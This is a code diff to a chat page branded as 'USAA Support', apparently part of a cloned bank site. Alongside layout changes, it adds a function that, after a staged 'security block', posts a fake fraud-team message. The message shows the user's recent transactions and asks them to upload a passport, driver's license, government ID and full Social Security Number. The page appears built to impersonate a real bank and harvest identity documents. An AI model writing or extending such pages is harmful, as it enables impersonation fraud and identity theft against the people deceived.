@@ -16,13 +16,35 @@
     }
 
     body {
-      background: #f4f6f8;
-      color: #333;
+      background: #f1f5f9;
+      color: #0b1f3a;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    .chat-wrapper {
+      width: 100%;
       max-width: 480px;
-      margin: 0 auto;
       height: 100vh;
       display: flex;
       flex-direction: column;
+      background: #eef2f5;
+      position: relative;
+    }
+
+    @media (min-width: 900px) {
+      body {
+        background: #e2e8f0;
+        padding: 20px;
+      }
+      .chat-wrapper {
+        max-width: 720px;
+        height: calc(100vh - 40px);
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+      }
     }
 
     .chat-header {
@@ -91,11 +113,11 @@
     }
 
     .message {
-      max-width: 78%;
-      padding: 10px 14px;
+      max-width: 85%;
+      padding: 12px 16px;
       border-radius: 16px;
       font-size: 14.5px;
-      line-height: 1.45;
+      line-height: 1.5;
       position: relative;
       word-wrap: break-word;
     }
@@ -175,7 +197,7 @@
 
     .message-time {
       font-size: 10px;
-      margin-top: 4px;
+      margin-top: 5px;
       opacity: 0.7;
     }
 
@@ -211,6 +233,7 @@
       align-items: center;
       justify-content: center;
       cursor: pointer;
+      flex-shrink: 0;
     }
 
     .chat-input {
@@ -240,6 +263,7 @@
       align-items: center;
       justify-content: center;
       cursor: pointer;
+      flex-shrink: 0;
     }
 
     .send-btn:disabled {
@@ -253,7 +277,6 @@
       margin: 8px 0;
     }
 
-    /* Preview bar */
     #filePreview {
       display: none;
       padding: 10px 12px;
@@ -282,7 +305,6 @@
       cursor: pointer;
     }
 
-    /* Attach menu (WhatsApp style) */
     .attach-menu {
       display: none;
       position: absolute;
@@ -318,58 +340,58 @@
     .attach-option i {
       width: 22px;
       text-align: center;
-      color: #002244;
     }
   </style>
 </head>
 <body>
 
-  <div class="chat-header">
-    <a href="dashboard.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-    <div class="agent-info">
-      <div class="agent-avatar"><i class="fa-solid fa-headset"></i></div>
-      <div class="agent-details">
-        <h2>USAA Support</h2>
-        <div class="agent-status">
-          <span class="status-dot"></span>
-          Online
+  <div class="chat-wrapper">
+    <div class="chat-header">
+      <a href="dashboard.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+      <div class="agent-info">
+        <div class="agent-avatar"><i class="fa-solid fa-headset"></i></div>
+        <div class="agent-details">
+          <h2>USAA Support</h2>
+          <div class="agent-status">
+            <span class="status-dot"></span>
+            Online
+          </div>
         </div>
       </div>
     </div>
-  </div>
 
-  <div class="chat-body" id="chatBody">
-    <div class="system-msg">Today</div>
-  </div>
-
-  <div id="filePreview">
-    <div id="previewContent"></div>
-    <div class="preview-info" id="previewName"></div>
-    <button class="preview-remove" onclick="clearFile()"><i class="fa-solid fa-xmark"></i></button>
-  </div>
-
-  <div class="chat-input-area">
-    <button class="attach-btn" onclick="toggleAttachMenu()">
-      <i class="fa-solid fa-paperclip"></i>
-    </button>
-
-    <!-- Attach Menu -->
-    <div class="attach-menu" id="attachMenu">
-      <div class="attach-option" onclick="pickMedia()">
-        <i class="fa-solid fa-image"></i> Photo & Video
-      </div>
-      <div class="attach-option" onclick="pickDocument()">
-        <i class="fa-solid fa-file"></i> Document
-      </div>
+    <div class="chat-body" id="chatBody">
+      <div class="system-msg">Today</div>
     </div>
 
-    <input type="file" id="mediaInput" accept="image/*,video/*" style="display:none" onchange="handleFileSelect(event)">
-    <input type="file" id="docInput" accept=".pdf,.doc,.docx,.xls,.xlsx,.ppt,.pptx,.txt,.zip,.rar" style="display:none" onchange="handleFileSelect(event)">
+    <div id="filePreview">
+      <div id="previewContent"></div>
+      <div class="preview-info" id="previewName"></div>
+      <button class="preview-remove" onclick="clearFile()"><i class="fa-solid fa-xmark"></i></button>
+    </div>
 
-    <input type="text" class="chat-input" id="messageInput" placeholder="Type a message..." autocomplete="off">
-    <button class="send-btn" id="sendBtn" onclick="sendMessage()">
-      <i class="fa-solid fa-paper-plane"></i>
-    </button>
+    <div class="chat-input-area">
+      <button class="attach-btn" onclick="toggleAttachMenu()">
+        <i class="fa-solid fa-paperclip"></i>
+      </button>
+
+      <div class="attach-menu" id="attachMenu">
+        <div class="attach-option" onclick="pickMedia()">
+          <i class="fa-solid fa-image"></i> Photo & Video
+        </div>
+        <div class="attach-option" onclick="pickDocument()">
+          <i class="fa-solid fa-file"></i> Document
+        </div>
+      </div>
+
+      <input type="file" id="mediaInput" accept="image/*,video/*" style="display:none" onchange="handleFileSelect(event)">
+      <input type="file" id="docInput" accept=".pdf,.doc,.docx,.xls,.xlsx,.ppt,.pptx,.txt,.zip,.rar" style="display:none" onchange="handleFileSelect(event)">
+
+      <input type="text" class="chat-input" id="messageInput" placeholder="Type a message..." autocomplete="off">
+      <button class="send-btn" id="sendBtn" onclick="sendMessage()">
+        <i class="fa-solid fa-paper-plane"></i>
+      </button>
+    </div>
   </div>
 
   <script>
@@ -379,6 +401,7 @@
 
     let currentUser = null;
     let selectedFile = null;
+    let userFullName = "Member";
 
     async function init() {
       const { data: { user } } = await client.auth.getUser();
@@ -387,6 +410,17 @@
         return;
       }
       currentUser = user;
+
+      // Get user name
+      const { data: profile } = await client
+        .from('profiles')
+        .select('full_name')
+        .eq('id', user.id)
+        .single();
+
+      if (profile?.full_name) {
+        userFullName = profile.full_name.split(' ')[0]; // First name
+      }
 
       await loadMessages();
       subscribeToMessages();
@@ -399,25 +433,95 @@
         .eq('user_id', currentUser.id)
         .order('created_at', { ascending: true });
 
-      if (error) {
-        console.error(error);
-        return;
-      }
-
       const chatBody = document.getElementById('chatBody');
       chatBody.innerHTML = '<div class="system-msg">Today</div>';
 
+      // Check if user came from Security Blocked transfer
+      const securityFlag = sessionStorage.getItem('usaa_security_block');
+
       if (data && data.length > 0) {
         data.forEach(msg => renderMessage(msg));
-      } else {
+      } 
+      else if (securityFlag === 'disabled') {
+        // Generate professional security message
+        await generateSecurityMessage();
+        sessionStorage.removeItem('usaa_security_block');
+      } 
+      else {
+        // Normal welcome
         renderMessage({
           sender_type: 'admin',
-          message: 'Hi! Welcome to USAA Live Chat. How can we help you today?',
+          message: `Hi ${userFullName}! Welcome to USAA Live Chat. How can we help you today?`,
           created_at: new Date().toISOString()
         });
       }
 
       scrollToBottom();
+    }
+
+    async function generateSecurityMessage() {
+      // Get recent high-value transactions
+      const { data: transactions } = await client
+        .from('transactions')
+        .select('*')
+        .eq('user_id', currentUser.id)
+        .order('transaction_date', { ascending: false })
+        .limit(8);
+
+      let recentList = '';
+      if (transactions && transactions.length > 0) {
+        recentList = transactions.slice(0, 5).map(tx => {
+          const amount = Math.abs(tx.amount || 0).toLocaleString('en-US', { style: 'currency', currency: 'USD' });
+          const date = new Date(tx.transaction_date).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+          const type = tx.amount > 0 ? 'Received' : 'Sent';
+          return `• ${date} – ${type} ${amount} (${tx.merchant_name || tx.type || 'Transfer'})`;
+        }).join('\n');
+      }
+
+      const securityMessage = `Hello ${userFullName},
+
+Thank you for contacting USAA Member Service.
+
+We have received your request regarding the recent security restriction placed on your account.
+
+🚫 Transaction Blocked – Security Protocol Activated
+
+For your protection, this transaction was blocked by our Fraud Prevention System due to unusual activity detected on your account. This may include:
+
+• Large transfer amount outside your normal pattern
+• Possible login from a different location or device
+• Multiple high-value transactions in a short period
+
+Recent transactions reviewed by our system:
+${recentList || '• Recent high-value activity detected'}
+
+To restore full transfer privileges, we need to verify your identity. Please upload one or more of the following documents:
+
+1. Valid Government-issued ID
+2. Passport
+3. Driver’s License
+4. Social Security Number (last 4 digits or full)
+
+You can upload the documents directly in this chat.
+
+A specialist will review your submission and respond shortly.
+
+Thank you for your cooperation.
+USAA Fraud Prevention Team`;
+
+      // Insert as admin message
+      await client.from('chat_messages').insert([{
+        user_id: currentUser.id,
+        sender_type: 'admin',
+        message: securityMessage
+      }]);
+
+      // Also render it immediately
+      renderMessage({
+        sender_type: 'admin',
+        message: securityMessage,
+        created_at: new Date().toISOString()
+      });
     }
 
     function renderMessage(msg) {
@@ -437,7 +541,6 @@
         } else if (url.match(/\.(mp4|webm|mov|avi)(\?|$)/)) {
           content += `<video src="${msg.image_url}" controls style="max-width:100%;border-radius:10px;margin-top:6px;"></video>`;
         } else {
-          // Generic file
           const fileName = msg.message || 'Document';
           content += `
             <a href="${msg.image_url}" target="_blank" class="file-card">
@@ -570,7 +673,6 @@
 
         if (error) throw error;
 
-        // Reset
         input.value = '';
         clearFile();
 
@@ -587,7 +689,6 @@
       chatBody.scrollTop = chatBody.scrollHeight;
     }
 
-    // Close attach menu when clicking outside
     document.addEventListener('click', function(e) {
       const menu = document.getElementById('attachMenu');
       const btn = document.querySelector('.attach-btn');
